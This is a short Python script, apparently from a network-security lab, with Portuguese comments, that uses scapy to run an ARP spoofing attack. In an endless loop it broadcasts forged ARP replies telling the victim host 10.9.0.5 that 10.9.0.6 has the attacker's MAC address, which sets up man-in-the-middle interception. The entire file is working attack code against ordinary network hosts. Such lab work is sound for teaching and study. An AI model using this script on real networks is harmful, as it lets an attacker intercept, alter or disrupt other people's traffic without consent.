import scapy.all as scapy
import subprocess
import time

# Funcao que pega o endereco MAC local pra enviar no pacote ARP
def get_localmac():
   result = subprocess.run("ifconfig -a | sed '4!d' | cut -b 15-31", stdout=subprocess.PIPE, shell=True)
   return result.stdout.decode().strip("\n")

# Pega interface de envio
def get_iface():
   result = subprocess.run("ifconfig -a | sed '1!d' | cut -d ':' -f1", stdout=subprocess.PIPE, shell=True)
   return result.stdout.decode().strip("\n")

# Vamos mandar um pacote para a vitima dizendo que o IP que queremos forjar tem nosso MAC
def spoof(mac, spoofed_src, dest):
   pkt=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=dest, hwsrc=mac, psrc=spoofed_src)
   # pkt.show()
   scapy.sendp(pkt, iface=get_iface(), verbose=False)

def main():
   mac = get_localmac()
   while True:
      spoof(mac, "10.9.0.6", "10.9.0.5")
      # spoof("02:42:0a:09:00:06", "10.9.0.5", "10.9.0.6")
      # time.sleep(10)
   # print(f'Pacote ARP enviado! 10.9.0.5 agora acha que somos o 10.9.0.6!')

if __name__ == "__main__":
   main()